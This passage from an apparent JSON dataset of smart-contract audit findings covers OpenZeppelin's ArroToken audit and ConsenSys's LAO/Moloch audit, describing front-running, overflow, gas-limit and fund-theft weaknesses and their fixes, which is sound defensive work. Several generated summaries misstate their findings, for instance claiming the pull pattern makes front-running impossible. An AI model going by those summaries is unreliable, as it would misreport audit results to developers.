(NatSpec).\n> \n> \n>",
      "summary": "\nThis bug report is about Arro's code base lacking proper documentation. This makes it difficult for reviewers to understand the code's intention and also makes it difficult to maintain. The report suggests that all functions (and their parameters) that are part of the contracts' public API should be thoroughly documented. Additionally, functions implementing sensitive functionality, even if not public, should be clearly documented as well. It is suggested that the documentation should follow the Ethereum Natural Specification Format (NatSpec). The bug has been partially fixed in pull request #1. Arro's statement for this issue is that the project structure has been changed to rely heavily on the OpenZeppelin ERC20 implementation, which provides a well-documented base of most of the contract functionality. The rest of the structure of the documentation has been changed to follow a consistent structure but will be updated in the future to follow the Ethereum Natural Specification Format (NatSpec).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "ArroToken Audit",
      "source_link": "https://blog.openzeppelin.com/arrotoken-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11760",
      "title": "Outdated solidity version in use",
      "impact": "MEDIUM",
      "content": "An outdated Solidity version, `0.4.24`, is currently in use.\n\n\nThis can introduce vulnerabilities to the project that were fixed in newer solidity versions, such as the short address attack in the `transfer` and `transferFrom` functions.  \n\nIn this attack, a user inputs a malformed address as destination for a token transfer in an exchange, which is misled to craft a transaction for a much bigger amount of tokens. This does not constitute an issue in the smart contract code per se, since it is ultimately the responsibility of the entity crafting the transaction to check its validity and integrity, but it should be taken into account when interacting with the token contract.\n\n\nConsider bumping the project to the latest version supported by [OpenZeppelin Contracts](https://github.com/OpenZeppelin/openzeppelin-contracts/tree/v2.4.0) (presently 0.5.15).\n\n\n***Update:** Fixed in [pull request #1](https://github.com/pjsimpkins/ArroERC20Code/pull/1).*",
      "summary": "\nA bug report has been identified in a project that is using an outdated version of Solidity, which is a programming language used for writing smart contracts. The version currently in use is 0.4.24, and this can introduce vulnerabilities to the project that have already been fixed in newer versions. \n\nOne such vulnerability is the short address attack, which can be used in the transfer and transferFrom functions of the token contract. This attack involves a malicious user inputting a malformed address as the destination of a token transfer in an exchange, which could result in a much bigger amount of tokens being sent than intended. \n\nTo fix this issue, the project should be bumped up to the latest version supported by OpenZeppelin Contracts (currently 0.5.15). This issue has now been resolved with the help of a pull request (#1).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "ArroToken Audit",
      "source_link": "https://blog.openzeppelin.com/arrotoken-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11759",
      "title": "No allowance front-running mitigation",
      "impact": "MEDIUM",
      "content": "The [`ArroToken` contract](https://github.com/pjsimpkins/ArroERC20Code/blob/1ca1cc85f2e7e046070c187031b75b3335ef57c3/Solidity#L105) is vulnerable to the ERC20 approve and double spend front-running attack.  \n\nIn this attack, a token owner authorizes another account to transfer a specific amount of tokens on their behalf, and in the case that the token owner decides to change that allowance amount, the spender could spend both allowances by front running the allowance-changing transaction.\n\n\nConsider using the [OpenZeppelin’s ERC20 implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.4.0/contracts/token/ERC20/ERC20.sol), and the [decreaseAllowance](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/cdf655f770cf8412fbd4d6aef3c55194a1233ef1/contracts/token/ERC20/ERC20.sol#L116) and [increaseAllowance](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/cdf655f770cf8412fbd4d6aef3c55194a1233ef1/contracts/token/ERC20/ERC20.sol#L135) functions to help mitigate this.\n\n\n***Update:** Fixed in [pull request #1](https://github.com/pjsimpkins/ArroERC20Code/pull/1).*",
      "summary": "\nThe ArroToken contract is vulnerable to an ERC20 approve and double spend front-running attack. This attack occurs when a token owner authorizes another account to transfer a specific amount of tokens on their behalf. If the token owner decides to change that allowance amount, the spender could spend both allowances by front running the allowance-changing transaction.\n\nTo help mitigate this, the OpenZeppelin’s ERC20 implementation can be used, along with the decreaseAllowance and increaseAllowance functions. This issue has been fixed in pull request #1.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "ArroToken Audit",
      "source_link": "https://blog.openzeppelin.com/arrotoken-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11758",
      "title": "Not following good Smart Contract development practices",
      "impact": "HIGH",
      "content": "The [ArroToken project](https://github.com/pjsimpkins/ArroERC20Code/commit/1ca1cc85f2e7e046070c187031b75b3335ef57c3) lacks of a standard Solidity project structure. There are no unit tests and integration tests implemented, and there is no code coverage set up. All the contracts are defined in the same file, which doesn’t have the proper file extension. Additionally, the [`README.md`](https://github.com/pjsimpkins/ArroERC20Code/blob/1ca1cc85f2e7e046070c187031b75b3335ef57c3/README.md) file is empty.\n\n\nConsider using the [OpenZeppelin SDK](https://openzeppelin.com/sdk/) or [Truffle](https://www.trufflesuite.com/) for setting up the project environment, organizing the contracts, and adequately develop the project.  \n\nConsider using the [OpenZeppelin Test Environment](https://github.com/OpenZeppelin/openzeppelin-test-environment) and [OpenZepplin Test Helpers](https://github.com/OpenZeppelin/openzeppelin-test-helpers) for [writing automated Smart Contract tests](https://docs.openzeppelin.com/learn/writing-automated-tests).  \n\nConsider adding relevant content to the `README.md` file to explain the project and its structure, and make it [Standard Readme](https://github.com/RichardLitt/standard-readme) compliant.\n\n\n***Update:** Partially fixed. Arro’s statement for this issue:*\n\n\n\n> \n>  The project has been restructured to follow the standard Solidity project structure provided by the OpenZeppelin CLI. The code functionality relies heavily on the provided libraries and interfaces from the OpenZeppelin SDK, this provides test coverage over a majority of the functionality. There are plans in the future to add unit or integration tests on contract functions.  \n> \n>  A relevant README has been added that provides general project information and installation and development instructions.\n> \n> \n> \n\n\n*Note that the project is missing the `.openzeppelin/project.json` file from the OpenZeppelin CLI.*",
      "summary": "\nThe ArroToken project lacks a standard Solidity project structure, has no unit tests and integration tests implemented, and there is no code coverage set up. All the contracts are defined in the same file, and the README.md file is empty. To fix this, it is recommended to use the OpenZeppelin SDK or Truffle for setting up the project environment, organizing the contracts, and adequately developing the project. Additionally, OpenZeppelin Test Environment and OpenZepplin Test Helpers can be used for writing automated Smart Contract tests. The README.md file should also be filled with relevant content to explain the project and make it Standard Readme compliant.\n\nThe issue has been partially fixed. Arro's statement for this issue is that the project has been restructured to follow the standard Solidity project structure provided by the OpenZeppelin CLI, and that a relevant README has been added. However, the project is still missing the .openzeppelin/project.json file from the OpenZeppelin CLI.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "ArroToken Audit",
      "source_link": "https://blog.openzeppelin.com/arrotoken-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11757",
      "title": "[introduced with the first round of fixes] Stray tokens can be locked in ArroToken contract.",
      "impact": "HIGH",
      "content": "The [`transferAnyERC20Token` function](https://github.com/pjsimpkins/ArroERC20Code/commit/624571234909c8353ed4af3958ac8a2ccd67b0e2#diff-38fb6a3b33704daa511018d2a39a5078d8a2e5676af51be449604b33f8331de3R46) is intended to transfer any ERC20 tokens accidentally received by the [`ArroToken` contract](https://github.com/pjsimpkins/ArroERC20Code/commit/624571234909c8353ed4af3958ac8a2ccd67b0e2#diff-38fb6a3b33704daa511018d2a39a5078d8a2e5676af51be449604b33f8331de3R27). However, this function calls the [`_transfer` internal function](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/v3.0.0/contracts/token/ERC20/ERC20.sol#L218) passing the address of the stray ERC20 token as the sender. This means that instead of transferring stray tokens out of the `ArroToken` contract, this function tries to transfer the `ArroToken`s owned by the stray contract.\n\n\nConsider calling the transfer function of the stray token contract, instead of the one from the `ArroToken` contract.",
      "summary": "\nThis bug report outlines an issue with the `transferAnyERC20Token` function in the `ArroToken` contract. This function is intended to transfer any ERC20 tokens accidentally received by the `ArroToken` contract, however, it calls the `_transfer` internal function passing the address of the stray ERC20 token as the sender. This means that instead of transferring stray tokens out of the `ArroToken` contract, this function tries to transfer the `ArroToken`s owned by the stray contract. \n\nThe suggested solution is to call the transfer function of the stray token contract, instead of the one from the `ArroToken` contract. This will ensure that the stray tokens are correctly transferred out of the `ArroToken` contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "ArroToken Audit",
      "source_link": "https://blog.openzeppelin.com/arrotoken-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "13882",
      "title": "Moloch - bool[6] flags can be changed to a dedicated structure  Won't Fix",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThe Moloch team decided to leave the `flags` structure as is, and added comments to all the usage of the boolean list values to increase readability and mitigate introduction of bugs due to future updates.\n\n\n#### Description\n\n\nThe Moloch contract uses a structure that includes an array of bools to store a few flags about the proposal:\n\n\n**code/contracts/Moloch.sol:L88**\n\n\n\n```\nbool[6] flags; // [sponsored, processed, didPass, cancelled, whitelist, guildkick]\n\n```\nThis makes reasoning about the correctness of the code a bit complicated because one needs to remember what each item in the flag list stands for. The make the reader’s life simpler a dedicated structure can be created that incorporates all of the required flags.\n\n\n#### Examples\n\n\n\n```\n        bool[6] memory flags; // [sponsored, processed, didPass, cancelled, whitelist, guildkick]\n\n```\n#### Recommendation\n\n\nBased on the provided examples change the `bool[6] flags` to the proposed examples.\n\n\n###### Flags as bool array with enum (proposed)\n\n\nThis second contract implements the `flags` as a defined structure with each **named** element representing a specific flag. This method makes clear which flag is accessed because they are referred to by the name, not by the index.\n\n\nThis third contract has the least amount of changes to the code and uses an enum structure to handle the index.\n\n\n\n```\npragma solidity 0.5.15;\n\ncontract FlagsEnum {\n    struct Proposal {\n        address applicant;\n        uint value;\n        bool[3] flags; // [sponsored, processed, kicked]\n    }\n   \n    enum ProposalFlags {\n        SPONSORED,\n        PROCESSED,\n        KICKED\n    }\n   \n    uint proposalCount;\n   \n    mapping(uint256 => Proposal) public proposals;\n   \n    function addProposal(uint \\_value, bool \\_sponsored, bool \\_processed, bool \\_kicked) public returns (uint) {\n        Proposal memory proposal = Proposal({\n            applicant: msg.sender,\n            value: \\_value,\n            flags: [\\_sponsored, \\_processed, \\_kicked]\n        });\n       \n        proposals[proposalCount] = proposal;\n        proposalCount += 1;\n       \n        return (proposalCount);\n    }\n   \n    function getProposal(uint \\_proposalId) public view returns (address, uint, bool, bool, bool) {\n        return (\n            proposals[\\_proposalId].applicant,\n            proposals[\\_proposalId].value,\n            proposals[\\_proposalId].flags[uint(ProposalFlags.SPONSORED)],\n            proposals[\\_proposalId].flags[uint(ProposalFlags.PROCESSED)],\n            proposals[\\_proposalId].flags[uint(ProposalFlags.KICKED)]\n        );\n    }\n}\n\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13881",
      "title": "Whitelist proposal duplicate  Won't Fix",
      "impact": "LOW",
      "content": "#### Description\n\n\nEvery time when a whitelist proposal is sponsored, it’s checked that there is no other sponsored whitelist proposal with the same token. This is done in order to avoid proposal duplicates.\n\n\n**code/contracts/Moloch.sol:L277-L281**\n\n\n\n```\n// whitelist proposal\nif (proposal.flags[4]) {\n    require(!tokenWhitelist[address(proposal.tributeToken)], \"cannot already have whitelisted the token\");\n    require(!proposedToWhitelist[address(proposal.tributeToken)], 'already proposed to whitelist');\n    proposedToWhitelist[address(proposal.tributeToken)] = true;\n\n```\nThe issue is that even though you can’t sponsor a duplicate proposal, you can still submit a new proposal with the same token.\n\n\n#### Recommendation\n\n\nCheck that there is currently no sponsored proposal with the same token on proposal submission.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13880",
      "title": "Dilution bound should be a fixed-point number  Won't Fix",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\na per-proposal dilution bound was considered for the v1, but kept it global in the interest of code simplicity.\n\n\n#### Description\n\n\nThe dilution bound is designed to mitigate an issue where a proposal is passed, then many users ragequit from the DAO and the remaining members have to pay more than they initially intended to. Because of that, the proposal will be automatically rejected if the total amount of shares becomes `dilutionBound` times less than it was before. The problem is that `dilutionBound` is an integer value and it’s impossible to configure it to decimal values such as 1.2, for example.\n\n\n#### Recommendation\n\n\nMake `dilutionBound` a fixed-point number.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13879",
      "title": "No votes are still valid after the ragequit/ragekick  Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nShareholders can vote for the upcoming proposals 2 weeks before they can be executed. If they ragequit or get ragekicked, their votes are still considered valid. And while the LAO does not allow anyone to ragequit before the last proposal with `Yes` vote is processed, it’s still possible to quit the LAO and having active `No` votes on some proposals.\n\n\nIt’s not naturally expected behaviour because by that time a user ragequits, they are not part of the LAO and do not have any voting power. Moreover, there is no incentive not to vote `No` just to fail all the possible proposals, because the user won’t be sharing any consequences of the result of these proposals. And even incentivized to vote `No` for every proposal just as the act of revenge for the ragekick.\n\n\n#### Recommendation\n\n\nThe problem is mitigated by the fact that all rejected proposals can be submitted again and be processed a few weeks after.\n\n\nIt’s possible to remove all the `No` votes from the proposals after user’s ragekick/ragequit.",
      "summary": "\nThis bug report concerns the issue of shareholders in a LAO (Limited Liability Autonomous Organization) being able to vote on proposals 2 weeks before they can be executed, even if they ragequit or get ragekicked. This is not expected behavior, as the user is no longer part of the LAO and should not have any voting power. It also creates a situation where a user may have incentive to vote 'No' on every proposal as an act of revenge for the ragekick.\n\nTo mitigate the issue, it is possible to remove all the 'No' votes from the proposals after the user's ragekick/ragequit. Additionally, all rejected proposals can be submitted again and be processed a few weeks later.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13878",
      "title": "Delegate assignment front-running  Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nAny member can front-run another member’s delegateKey assignment.\n\n\nif you try to submit an address as your delegateKey, someone else can try to assign your delegate address tp themselves. While incentive of this action is unclear, it’s possible to block some address from being a delegate forever. `ragekick` and `ragequit` do not free the delegate address and the delegate itself also cannot change the address.\n\n\nThe possible attack could be that a well-known hard-to-replace multisig address is assigned as a delegateKey and someone else take this address to block it. Also, if the malicious member is about to ragequit or be kicked, it’s possible to do this attack without losing anything.\n\n\nThe only way to free the delegate is to make it a member, but then it can never be a delegate after.\n\n\n#### Recommendation\n\n\nMake it possible for a delegateKey to approve delegateKey assignment or cancel the current delegation. And additionally, it may be valuable to clear the delegate address in the `_ragequit` function.\n\n\nCommit-reveal methods can also be used to mitigate this attack.",
      "summary": "\nThis bug report is about a vulnerability which allows members to front-run another member's delegateKey assignment. This means that if someone tries to submit an address as their delegateKey, someone else can try to assign the same address to themselves. This could be used to block certain addresses from ever being assigned as a delegate. The only way to free the delegate is to make it a member, but then it can never be a delegate again.\n\nThe report suggests implementing a system where the delegateKey can approve or cancel the current delegation. Additionally, it is recommended that the delegate address be cleared in the `_ragequit` function. Lastly, the report suggests using commit-reveal methods to mitigate this attack.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13877",
      "title": "Sponsorship front-running ✓ Fixed in Pull Pattern",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nthis issue no longer exists in the Pull Pattern update with Major severity, as mentioned in the recommendation, the front-running vector is still open but no rationale exist for such a behaviour.\n\n\n#### Description\n\n\nIf proposal submission and sponsorship are done in 2 different transactions, it’s possible to front-run the `sponsorProposal` function by any member. The incentive to do that is to be able to block the proposal afterwards. It’s sometimes possible to block the proposal by getting blacklisted at `depositToken`. In that case, the proposal won’t be accepted and the emergency processing is going to happen next. Currently, if the attacker can become whitelisted again, he might even not lose the deposit tokens. If not, it will block the whole system forever and everyone would have to ragequit (but that’s the part of another issue).\n\n\n#### Recommendation\n\n\nPull pattern for token transfers will solve the issue. Front-running will still be possible but it doesn’t affect anything.",
      "summary": "\nThis bug report is about a vulnerability in a proposal submission and sponsorship system, where an attacker can front-run the `sponsorProposal` function, potentially blocking the proposal and making the system unusable. The recommendation is to implement a Pull Pattern for token transfers, which would solve the issue by making front-running impossible. This update has been applied with Major severity, meaning the issue no longer exists. However, there is still no rationale for such a behaviour.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13876",
      "title": "Summoner can steal funds using bailout ✓ Fixed in Pull Pattern",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\n`bailout` no longer exists in the Pull Pattern update. Note that in case the member loses their private key the funds will be lost.\n\n\n#### Description\n\n\nCurrently, there are 2 major reasons for using the `bailout` function:\n\n\n1. Kick someone out of the LAO. If the shareholders vote for kicking somebody, the kicked user goes to jail at first. If the LAO kicks someone, it’s important not to steal user’s funds, but remove them from profit-sharing as soon as possible. Currently, because the user can potentially block some token transfers, funds can’t be transferred and the user is still having loot and is participation in a profit-sharing. In order to avoid that, `bailout` function was introduced. It allows anyone to transfer kicked user’s funds to the summoner if the user does not call `safeRagequit` (which forces the user to lose some funds). The intention is for the summoner to transfer these funds to the kicked member afterwards.\nThe issue here is that it requires a lot of trust to the summoner on the one hand, and requires more time to kick the member out of the LAO.\n2. “lost private key” problem. If someone’s private key was lost, shareholders can allow summoner to transfer funds from any user whose keys were lost. The problem is that any member’s funds can be stolen by the LAO members and the summoner like that. So every member should keep track of that kind of proposal and is forced to do the ragequit if that proposal passes. That decreases trustlessness because if a user is not tracking the system for some time, the user’s money can possibly be stolen.\n\n\n#### Recommendation\n\n\n1. To solve these issues, these 2 intentions should be split into 2 different mechanisms. By implementing pull pattern for token transfers, kicked member won’t be able to block the `ragekick` and the LAO members would be able to kick anyone much quicker. There is no need to keep the `bailout` for this intention.\n2. If “lost private key” problem should be addressed in the LAO, the time period for the funds recovery should be big because there is no need to do the recovery asap. Recovery can be done without a preliminary kick and can even cover not only the `shares` and `loot`, but also tokens that should be withdrawn (if pull pattern is implemented)",
      "summary": "\nThe bug report discusses two main reasons for using the `bailout` function in the Pull Pattern update. The first reason is to kick someone out of the LAO and avoid them stealing user funds. The second reason is to address the “lost private key” problem. The issue is that it requires a lot of trust to the summoner and requires more time to kick the member out of the LAO. \n\nThe recommendation is to split these two intentions into two different mechanisms. The first is to implement the pull pattern for token transfers so that the kicked member won’t be able to block the `ragekick` and the LAO members would be able to kick anyone much quicker. The second is to have a longer time period for funds recovery in cases of lost private keys. This would allow for recovery without a preliminary kick and cover not only the `shares` and `loot`, but also tokens that should be withdrawn.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13875",
      "title": "Whitelisted tokens limit ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nmitigated by having separate limits for number of whitelisted tokens (for non-zero balance and for zero balance) in [486f1b3](https://github.com/MolochVentures/moloch/commit/486f1b3e72c8e48f614c3b22a0220de63b5320bd) and follow up commits. That’s helpful because it’s much cheaper to process tokens with zero balance in the guild bank and you can have much more whitelisted tokens overall.\n\n\n\n```\nuint256 constant MAX\\_TOKEN\\_WHITELIST\\_COUNT = 400; // maximum number of whitelisted tokens\nuint256 constant MAX\\_TOKEN\\_GUILDBANK\\_COUNT = 200; // maximum number of tokens with non-zero balance in guildbank\nuint256 public totalGuildBankTokens = 0; // total tokens with non-zero balance in guild bank\n\n```\nIt should be noted that this is an estimated limit based on the [manual calculations](https://docs.google.com/spreadsheets/d/1LFtETGOsghYVJeTIF4v1L9cBB3IKu1LS9ypb7b-GtVY/edit#gid=0) and current OP code gas costs. DAO members should consider splitting the DAO into two if more than 100 tokens with non-zero balance are used in the DAO to be safe.\n\n\n\n\n#### Description\n\n\n`_ragequit` function is iterating over all whitelisted tokens:\n\n\n**contracts/Moloch.sol:L507-L513**\n\n\n\n```\nfor (uint256 i = 0; i < tokens.length; i++) {\n    uint256 amountToRagequit = fairShare(userTokenBalances[GUILD][tokens[i]], sharesAndLootToBurn, initialTotalSharesAndLoot);\n    // deliberately not using safemath here to keep overflows from preventing the function execution (which would break ragekicks)\n    // if a token overflows, it is because the supply was artificially inflated to oblivion, so we probably don't care about it anyways\n    userTokenBalances[GUILD][tokens[i]] -= amountToRagequit;\n    userTokenBalances[memberAddress][tokens[i]] += amountToRagequit;\n}\n\n```\nIf the number of tokens is too big, a transaction can run out of gas and all funds will be blocked forever. Ballpark estimation of this number is around 300 tokens based on the current OpCode gas costs and the block gas limit.\n\n\n#### Recommendation\n\n\nA simple solution would be just limiting the number of whitelisted tokens.\n\n\nIf the intention is to invest in many new tokens over time, and it’s not an option to limit the number of whitelisted tokens, it’s possible to add a function that removes tokens from the whitelist. For example, it’s possible to add a new type of proposals, that is used to vote on token removal if the balance of this token is zero. Before voting for that, shareholders should sell all the balance of that token.",
      "summary": "\nThis bug report covers a potential issue with the `_ragequit` function in the Moloch smart contract. If the number of whitelisted tokens is too large, the transaction can run out of gas and all funds will be blocked forever. The estimated limit for the number of whitelisted tokens is around 300 based on the current OpCode gas costs and the block gas limit. \n\nThe bug was mitigated by having separate limits for the number of whitelisted tokens with non-zero balance and for zero balance in the guild bank. This allows for more whitelisted tokens overall and is much cheaper to process. \n\nThe recommended solution is to limit the number of whitelisted tokens. Alternatively, a new type of proposal can be added that votes on token removal if the balance of the token is zero. Before voting for removal, shareholders should sell all the balance of the token.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13874",
      "title": "Token Overflow might result in system halt or loss of funds ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFixed in [fd2da6](https://github.com/MolochVentures/moloch/commit/fd2da66773c0cd09fa5db54c6e3ecd79042a170b), and [32ad9b](https://github.com/MolochVentures/moloch/commit/32ad9b9c6f05ac2d81c07b011da6ccaf2dae9b08) by allowing overflows in most balance calculations (e.g. `unsafeSubtractFromBalance` and `unsafeAddToBalance`).\nThis is to prevent system halt, however as mentioned above, in case of overflow the token balance will be incorrect for token holders and members should take that into account when approving future proposals.\n\n\n#### Description\n\n\nIf a token overflows, some functionality such as `processProposal`, `cancelProposal` will break due to safeMath reverts. The overflow could happen because the supply of the token was artificially inflated to oblivion.\n\n\nThis issue was pointed out by [Heiko Fisch](https://github.com/HeikoFisch) in Telegram chat.\n\n\n#### Examples\n\n\nAny function using `internalTransfer()` can result in an overflow:\n\n\n**contracts/Moloch.sol:L631-L634**\n\n\n\n```\nfunction max(uint256 x, uint256 y) internal pure returns (uint256) {\n    return x >= y ? x : y;\n}\n\n\n```\n#### Recommendation\n\n\nWe recommend to allow overflow for broken or malicious tokens. This is to prevent system halt or loss of funds. It should be noted that in case an overflow occurs, the balance of the token will be incorrect for all token holders in the system.\n\n\n`rageKick`, `rageQuit` were fixed by not using safeMath within the function code, however this fix is risky and not recommended, as there are other overflows in other functions that might still result in system halt or loss of funds.\n\n\nOne suggestion is having a function named `unsafeInternalTransfer()` which does not use safeMath for the cases that overflow should be allowed. This mainly adds better readability to the code.\n\n\n**It is still a risky fix and a better solution should be planned.**",
      "summary": "\nA bug was identified that could cause system halt or loss of funds if a token overflows due to an artificially inflated supply. This was pointed out by Heiko Fisch in the Telegram chat. The overflow could occur if any function used `internalTransfer()` and the `max()` function in contracts/Moloch.sol (lines 631-634). This was fixed by allowing overflows in most balance calculations (e.g. `unsafeSubtractFromBalance` and `unsafeAddToBalance`). However, this means that the token balance will be incorrect for token holders, and members should take this into account when approving future proposals. It is recommended to allow overflow for broken or malicious tokens, but this is a risky fix and a better solution should be planned. One suggestion is having a function named `unsafeInternalTransfer()` which does not use safeMath for the cases that overflow should be allowed, as this would add better readability to the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13873",
      "title": "Emergency processing can be blocked ✓ Fixed in Pull Pattern",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nEmergency Processing no longer exists in the Pull Pattern update.\n\n\n#### Description\n\n\nThe main reason for the emergency processing mechanism is that there is a chance that some token transfers might be blocked. For example, a sender or a receiver is in the USDC blacklist. Emergency processing saves from this problem by not transferring tribute token back to the user (if there is some) and rejecting the proposal.\n\n\n**code/contracts/Moloch.sol:L407-L411**\n\n\n\n```\nif (!emergencyProcessing) {\n    require(\n        proposal.tributeToken.transfer(proposal.proposer, proposal.tributeOffered),\n        \"failing vote token transfer failed\"\n    );\n\n```\nThe problem is that there is still a deposit transfer back to the sponsor and it could be potentially blocked too. If that happens, proposal can’t be processed and the LAO is blocked.\n\n\n#### Recommendation\n\n\nImplementing pull pattern for all token withdrawals would solve the problem. The alternative solution would be to also keep the deposit tokens in the LAO, but that makes sponsoring the proposal more risky for the sponsor.",
      "summary": "\nA bug has been reported in the code/contracts/Moloch.sol, lines 407-411, which affects the emergency processing mechanism. This mechanism exists to prevent token transfers from being blocked, for example if a sender or a receiver is in the USDC blacklist. Currently, the emergency processing no longer exists in the Pull Pattern update, meaning there is a chance that token transfers could still be blocked. This would prevent proposals from being processed and the LAO from being able to function. To fix this, it is recommended to implement Pull Pattern for all token withdrawals. An alternative solution would be to keep the deposit tokens in the LAO, but this would make sponsoring the proposal more risky for the sponsor.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13872",
      "title": "Creating proposal is not trustless ✓ Fixed in Pull Pattern",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nthis issue no longer exists in the Pull Pattern update, due to the fact that emergency processing and in function ERC20 transfers are removed.\n\n\n#### Description\n\n\nUsually, if someone submits a proposal and transfers some amount of tribute tokens, these tokens are transferred back if the proposal is rejected. But if the proposal is not processed before the emergency processing, these tokens will not be transferred back to the proposer. This might happen if a tribute token or a deposit token transfers are blocked.\n\n\n**code/contracts/Moloch.sol:L407-L411**\n\n\n\n```\nif (!emergencyProcessing) {\n    require(\n        proposal.tributeToken.transfer(proposal.proposer, proposal.tributeOffered),\n        \"failing vote token transfer failed\"\n    );\n\n```\nTokens are not completely lost in that case, they now belong to the LAO shareholders and they might try to return that money back. But that requires a lot of coordination and time and everyone who ragequits during that time will take a part of that tokens with them.\n\n\n#### Recommendation\n\n\nPull pattern for token transfers would solve the issue.",
      "summary": "\nThis bug report is about an issue with transferring tribute tokens when a proposal is rejected. If the proposal is not processed before the emergency processing, these tokens will not be transferred back to the proposer. This might happen if a tribute token or a deposit token transfers are blocked. The code/contracts/Moloch.sol:L407-L411 is the code that is affected. The tokens are not completely lost, but they now belong to the LAO shareholders, and they might try to return that money back. However, this requires coordination and time. The recommendation is to use a pull pattern for token transfers, which would solve the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13871",
      "title": "safeRagequit makes you lose funds ✓ Fixed in Pull Pattern",
      "impact": "HIGH",
